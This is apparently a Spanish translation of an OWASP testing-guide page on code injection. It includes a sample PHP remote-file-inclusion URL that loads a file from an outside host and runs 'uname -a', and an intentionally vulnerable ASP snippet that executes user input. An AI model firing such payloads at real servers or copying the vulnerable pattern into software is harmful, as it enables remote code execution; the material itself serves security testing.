# Inyección de código

|ID          |
|------------|
|WSTG-INJT-11|

## Resumen

Esta sección describe cómo un evaluador puede comprobar si es posible introducir código como entrada en una página web y hacer que el servidor web lo ejecute.

En las pruebas de [inyección de código](https://owasp.org/www-community/attacks/Code_Injection), un evaluador envía una entrada que el servidor web procesa como código dinámico o como un archivo incluido. Estas pruebas pueden dirigirse a varios motores de scripting del lado del servidor, por ejemplo, ASP o PHP. Para protegerse contra estos ataques, se deben aplicar una validación adecuada de las entradas y prácticas de codificación segura.

## Objetivos de la prueba

- Identificar puntos de inyección en los que se pueda inyectar código en la aplicación.
- Evaluar la gravedad de la inyección.

## Cómo probar

### Pruebas de caja negra

#### Vulnerabilidades de inyección de PHP

Mediante la cadena de consulta, el evaluador puede inyectar código (en este ejemplo, una URL maliciosa) para que se procese como parte del archivo incluido:

`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> La URL maliciosa se acepta como parámetro de la página PHP, que posteriormente usará el valor en un archivo incluido.

### Pruebas de caja gris

#### Vulnerabilidades de inyección de código ASP

Examine el código ASP en busca de entradas del usuario utilizadas en funciones de ejecución. ¿Puede el usuario introducir comandos en el campo de entrada Data? En este caso, el código ASP guardará la entrada en un archivo y luego la ejecutará:

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))
```

### Referencias

- [Insecure.org](https://insecure.org/)
- [Wikipedia](https://www.wikipedia.org)
- [OWASP Community - Inyección de código](https://community.owasp.org/attacks/Code_Injection)